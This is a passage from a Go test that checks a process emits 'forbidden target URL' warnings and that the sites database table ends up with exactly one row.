		if strings.Contains(w, "forbidden target URL") {
			warned++
		}
	}
	if warned == 0 {
		t.Fatalf("expected forbidden-URL warnings, got %v", result.Warnings)
	}

	var count int
	if err := db.Get(&count, "SELECT COUNT(*) FROM sites"); err != nil {
		t.Fatalf("count sites: %v", err)
	}
	if count != 1 {
		t.Fatalf("sites rows = %d, want 1", count)
	}
}
